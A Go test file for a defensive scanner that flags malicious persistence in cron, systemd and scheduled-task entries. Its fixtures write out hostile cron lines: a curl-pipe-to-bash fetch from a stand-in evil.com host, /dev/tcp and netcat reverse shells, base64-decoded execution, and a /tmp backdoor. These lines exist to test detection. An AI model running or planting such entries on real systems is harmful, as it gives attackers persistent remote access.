package persistence_test

import (
	"context"
	"fmt"
	"os"
	"path/filepath"
	"testing"

	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner"
	"github.com/nunenuh/defense-kit/defense-kit-cli/internal/scanner/persistence"
)

// ---- CronScanner interface tests ----

func TestCronScanner_Interface(t *testing.T) {
	s := persistence.NewCronScanner()

	if s.Name() != "cron" {
		t.Errorf("Name() = %q, want %q", s.Name(), "cron")
	}
	if s.Category() != "persistence" {
		t.Errorf("Category() = %q, want %q", s.Category(), "persistence")
	}
	if !s.RequiresRoot() {
		t.Error("RequiresRoot() should be true")
	}
	if !s.Available() {
		t.Error("Available() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
	if s.RequiredTools() != nil {
		t.Error("RequiredTools() should be nil")
	}
	if s.OptionalTools() != nil {
		t.Error("OptionalTools() should be nil")
	}
}

// ---- SystemdScanner interface tests ----

func TestSystemdScanner_Interface(t *testing.T) {
	s := persistence.NewSystemdScanner()

	if s.Name() != "systemd" {
		t.Errorf("Name() = %q, want %q", s.Name(), "systemd")
	}
	if s.Category() != "persistence" {
		t.Errorf("Category() = %q, want %q", s.Category(), "persistence")
	}
	if !s.RequiresRoot() {
		t.Error("RequiresRoot() should be true")
	}
	if !s.Available() {
		t.Error("Available() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
}

// ---- ScheduledScanner interface tests ----

func TestScheduledScanner_Interface(t *testing.T) {
	s := persistence.NewScheduledScanner()

	if s.Name() != "scheduled" {
		t.Errorf("Name() = %q, want %q", s.Name(), "scheduled")
	}
	if s.Category() != "persistence" {
		t.Errorf("Category() = %q, want %q", s.Category(), "persistence")
	}
	if !s.RequiresRoot() {
		t.Error("RequiresRoot() should be true")
	}
	if !s.Available() {
		t.Error("Available() should be true")
	}
	if s.Description() == "" {
		t.Error("Description() should not be empty")
	}
}

// ---- CronScanner functional tests ----

// cronScanFile is a helper that writes content to a temp file, points the scanner
// at it via a custom scan helper, and returns findings.
// Because CronScanner scans fixed system paths we need a way to inject a temp
// file. We expose this via a package-level helper that is only compiled in
// tests (see scanCronFileForTest below).
func writeTempCronFile(t *testing.T, content string) string {
	t.Helper()
	dir := t.TempDir()
	path := filepath.Join(dir, "test-cron")
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatalf("failed to write temp cron file: %v", err)
	}
	return path
}

func TestCronScanner_DetectsSuspiciousEntries(t *testing.T) {
	suspiciousLines := []struct {
		line  string
		title string
	}{
		{
			line:  "* * * * * root curl http://evil.com/payload.sh | bash",
			title: "Pipe-to-shell execution in cron",
		},
		{
			line:  "*/5 * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
			title: "Reverse shell via /dev/tcp in cron",
		},
		{
			line:  "0 * * * * root echo aGVsbG8= | base64 -d | sh",
			title: "Base64-decoded execution in cron",
		},
		{
			line:  "*/10 * * * * root /tmp/backdoor.sh",
			title: "Executable in world-writable directory in cron",
		},
		{
			line:  "* * * * * root nc -e /bin/sh 10.0.0.1 4444",
			title: "Netcat/xterm reverse shell in cron",
		},
	}

	for _, tc := range suspiciousLines {
		tc := tc
		t.Run(tc.title, func(t *testing.T) {
			content := fmt.Sprintf("# normal comment\nSHELL=/bin/bash\nPATH=/sbin:/bin\n%s\n", tc.line)
			path := writeTempCronFile(t, content)

			findings, err := persistence.ScanCronFileForTest(path)
			if err != nil {
				t.Fatalf("ScanCronFileForTest returned error: %v", err)
			}
			if len(findings) == 0 {
				t.Fatalf("expected findings for line %q, got none", tc.line)
			}

			// Verify required fields.
			for _, f := range findings {
				if f.ID == "" {
					t.Error("finding has empty ID")
				}
				if f.Scanner != "cron" {
					t.Errorf("Scanner = %q, want %q", f.Scanner, "cron")
				}
				if f.Evidence == "" {
					t.Error("finding has empty Evidence")
				}
				if f.Location == "" {
					t.Error("finding has empty Location")
				}
				if f.Severity < scanner.SevHigh {
					t.Errorf("expected severity >= HIGH, got %s", f.Severity)
				}
			}
		})
	}
}

func TestCronScanner_CleanFileNoFindings(t *testing.T) {
	content := `# /etc/crontab: system-wide crontab
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 * * * * root cd / && run-parts --report /etc/cron.hourly
25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
`
	path := writeTempCronFile(t, content)

	findings, err := persistence.ScanCronFileForTest(path)
	if err != nil {
		t.Fatalf("ScanCronFileForTest returned error: %v", err)
	}
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for clean file, got %d: %+v", len(findings), findings)
	}
}

func TestCronScanner_ContextAndOptions(t *testing.T) {
	// Scan() with default options should not error (files just won't exist in CI).
	s := persistence.NewCronScanner()
	findings, err := s.Scan(context.Background(), scanner.ScanOptions{})
	if err != nil {
		t.Fatalf("Scan returned unexpected error: %v", err)
	}
	// findings may be nil or empty — both are acceptable.
	_ = findings
}
